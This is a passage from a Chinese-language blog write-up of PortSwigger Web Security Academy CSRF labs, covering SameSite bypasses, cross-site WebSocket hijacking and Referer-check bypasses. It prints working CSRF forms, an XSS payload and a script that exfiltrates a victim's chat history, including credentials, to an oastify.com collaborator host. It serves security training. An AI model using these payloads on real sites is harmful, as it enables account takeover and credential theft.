+<p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;that changes the victim’s email address. You should use the provided exploit server to host your attack.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>工具题目可知需要利用到重定向</p>
+<p>先走下正常的修改流程</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306204018.png"></p>
+<p>没什么特别的</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306205134.png"></p>
+<p>修改为 GET 方式也能进行修改</p>
+<p>在页面下还存在评论功能</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306210722.png"></p>
+<p>评论后页面 302 重定向到 <code>/post/comment/confirmation</code>  页面中</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306210815.png"></p>
+<p><code>/post/comment/confirmation</code> 下又调用了 <code>/resources/js/commentConfirmationRedirect.js</code> 脚本</p>
+<p>该脚本内容</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">redirectOnConfirmation</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">blogPath</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> postId <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"postId"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        window<span class="token punctuation">.</span>location <span class="token operator">=</span> blogPath <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> postId<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将 postId 拼接后进行重定向，这里的 postId 可控即可控制任意 URL 地址</p>
+<p>结合之前通过 GET 方式修改 email 地址</p>
+<p>构造 POC</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span> 
+	document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=6/../../my-account/change-email%3femail%3dwiener%40wiener.com%26submit%3d1"</span><span class="token punctuation">;</span> 
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306211703.png"></p>
+<h3 id="9-Lab-SameSite-Strict-bypass-via-sibling-domain"><a href="#9-Lab-SameSite-Strict-bypass-via-sibling-domain" class="headerlink" title="9. Lab: SameSite Strict bypass via sibling domain"></a>9. Lab: SameSite Strict bypass via sibling domain</h3><p>#CSRF-WebSocket</p>
+<ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s live chat feature is vulnerable to&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">cross-site WebSocket hijacking</a>&nbsp;(<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">CSWSH</a>). To solve the lab, log in to the victim’s account.</p>
+<p>To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim’s chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.</p>
+<p>If you haven’t done so already, we recommend completing our topic on&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets">WebSocket vulnerabilities</a>&nbsp;before attempting this lab.</p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>这次没给测试用户，在登录用户处的 username 处存在 XSS 注入</p>
+<p>POC</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]
+/login?username="/&gt;&lt;script&gt;alert('xssss')&lt;/script&gt;&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306214715.png"></p>
+<p>可以在此处执行 script 脚本</p>
+<p>同时还存在一个在线聊天室</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306214913.png"></p>
+<p>通过 WebSocket 传送消息</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306215153.png"></p>
+<p>进行一些会话没给出什么有用的信息</p>
+<p>刷新页面</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306221521.png"></p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306221529.png"></p>
+<p>客户端向服务端发送一个 READY，然后服务端将所有的聊天记录发送到客户端</p>
+<p>当未携带 Cookie 发送 Websocket 时</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306222541.png"></p>
+<p>会返回一个新的会话以及设置 SameSite=Strict，这会阻止浏览器表单，包括 Cookie。</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306223158.png"></p>
+<p>在资源请求 <code>/resources/images/shop.svg</code> 时使用到了另一个域 <code>cms-0abc000d0342c139c2296b1b002c0025.web-security-academy.net</code></p>
+<p>访问之后</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306223346.png"></p>
+<p>在 username 处仍然存在 XSS 注入</p>
+<p>由于此同级域是同一站点的一部分，因此您可以使用此 XSS 启动 CSWSH 攻击，而不会受到 SameSite 限制的缓解。</p>
+<p>编写个 POC</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+    var ws = new WebSocket('wss://0abc000d0342c139c2296b1b002c0025.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://6t0lypkq9ngkxupju6m15nn3buhl5ft4.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+    ws.send("Hello");
+&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>建立一个 WebSocket 会话并且发送数据，在接收到消息时将消息发送到对应的服务器上</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306215934.png"></p>
+<p>获取到了响应信息也只有一条，由于 SameSite 的限制也只会有一条，并不能获取到完整的聊天记录</p>
+<p>因此可以利用之前的 XSS 漏洞进行攻击（同源）</p>
+<p>构造 Payload</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">[GET]
+/login?username="/&gt;%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0abc000d0342c139c2296b1b002c0025.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2F6t0lypkq9ngkxupju6m15nn3buhl5ft4.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&amp;password=anything<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306221854.png"></p>
+<p>获取到了聊天记录</p>
+<p>接下来编写 POC 使服务端触发</p>
+<p><strong>绕过同站点限制</strong></p>
+<p>我们重用以前的漏洞并对其进行 URL 编码。然后，我们使用以下新漏洞。我们在用户名参数中包含 URL 编码的有效负载。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"https://cms-0abc000d0342c139c2296b1b002c0025.web-security-academy.net/login?username=\"/&gt;%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0abc000d0342c139c2296b1b002c0025.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2F6t0lypkq9ngkxupju6m15nn3buhl5ft4.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&amp;password=anything"</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这里的 cms-xxx 在哪愣是没找到<br><img src="/../../../../../pic/Pasted%20image%2020230306222026.png"></p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306223506.png"></p>
+<p>获取到用户名与密码</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306223547.png"></p>
+<p>登录后结束</p>
+<h3 id="10-Lab-SameSite-Lax-bypass-via-cookie-refresh"><a href="#10-Lab-SameSite-Lax-bypass-via-cookie-refresh" class="headerlink" title="10. Lab: SameSite Lax bypass via cookie refresh"></a>10. Lab: SameSite Lax bypass via cookie refresh</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;that changes the victim’s email address. You should use the provided exploit server to host your attack.</p>
+<p>The lab supports OAuth-based login. You can log in via your social media account with the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>使用 wiener / peter 登录经过了 OAuth 的认证，在设置 Cookie 时并没有设置 SameSite 限制，因此为默认 Laz</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306231132.png"></p>
+<p>生成个 POC</p>
+<p>在较短的时间内不需要再次经过 OAuth 认证即可攻击成功</p>
+<p>在有一段时间之后则需要先请求 OAuth 先进行认证，然后再一段时间之后再进行攻击</p>
+<p>POC</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a020009030145bcc28693de00190075.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>
+      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"admin668&amp;#64;admin&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+      window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"https://0a020009030145bcc28693de00190075.web-security-academy.net/social-login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	  <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在点击时就会先去认证，然后一段时间之后再进行攻击修改邮箱</p>
+<p>访问 POC</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306231538.png"></p>
+<p>在 Chrome 中自动组织了弹出窗口，因此需要引诱用户自己点击从而执行脚本</p>
+<p>构造新 POC</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a020009030145bcc28693de00190075.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>
+      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"test&amp;#64;test&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
+		<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Click Me<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+      window<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+		window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://0a020009030145bcc28693de00190075.web-security-academy.net/social-login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeEmail<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+
+		<span class="token keyword">function</span> <span class="token function">changeEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在用户点击之后会执行认证，在差不多认证完之后再修改邮箱</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306232150.png"></p>
+<h3 id="11-Lab-CSRF-where-Referer-validation-depends-on-header-being-present"><a href="#11-Lab-CSRF-where-Referer-validation-depends-on-header-being-present" class="headerlink" title="11. Lab: CSRF where Referer validation depends on header being present"></a>11. Lab: CSRF where Referer validation depends on header being present</h3><p>#Referer </p>
+<ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>在登录中设置 SameSite 为  None，即不受域的限制</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306232611.png"></p>
+<p>在修改 Referer 之后，发包</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306232830.png"></p>
+<p>检测到来源不符，不予通过</p>
+<p>可以在 POC 中添加</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>referrer<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no-referrer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>用于禁止 referer</p>
+<p>构造 POC</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"referrer"</span> content<span class="token operator">=</span><span class="token string">"no-referrer"</span><span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a680083037ef0c1c24d1bca00d0000c.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>
+      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"test&amp;#64;test&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
+      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit request"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306233031.png"></p>
+<h3 id="12-Lab-CSRF-with-broken-Referer-validation"><a href="#12-Lab-CSRF-with-broken-Referer-validation" class="headerlink" title="12. Lab: CSRF with broken Referer validation"></a>12. Lab: CSRF with broken Referer validation</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>可以将原始域以查询字符串的形式将其追加到 Referer 标头</p>
+<pre class="line-numbers language-none"><code class="language-none">Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>构造 POC</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">CSRF</span> PoC <span class="token operator">-</span> generated by Burp Suite Professional <span class="token operator">--</span><span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"https://0a6100e90307b976c1d6a9df00d9001f.web-security-academy.net/my-account/change-email"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">&gt;</span>
+      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"email"</span> value<span class="token operator">=</span><span class="token string">"admin1&amp;#64;admin&amp;#46;com"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
+    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
+			history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"/?0a6100e90307b976c1d6a9df00d9001f.web-security-academy.net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这将导致生成的请求中的 Referer 标头在查询字符串中包含目标站点的 URL，就像我们之前测试的那样。</p>
+<p>许多浏览器现在默认从 Referer 标头中删除查询字符串。要覆盖此行为并确保请求中包含完整的 URL，请返回到漏洞利用服务器并将以下标头添加到“Head”部分：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Referrer-Policy: unsafe-url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306234342.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45728976/article/details/104506544?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167828679716800182152124%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167828679716800182152124&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-104506544-null-null.blog_rank_default&amp;utm_term=CSRF&amp;spm=1018.2226.3001.4450">漏洞复现篇——CSRF漏洞的利用_csrf漏洞利用_admin-r꯭o꯭ot꯭的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/343515825">什么是CSRF？如何防御CSRF攻击？知了堂告诉你 - 知乎 (zhihu.com)</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">nahv0</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.nahv0.top/2023/01/28/skilllearning/csrf/csrf-yuan-li-gong-ji/">https://www.nahv0.top/2023/01/28/skilllearning/csrf/csrf-yuan-li-gong-ji/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">nahv0</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CSRF/">
+                                    <span class="chip bg-color">CSRF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
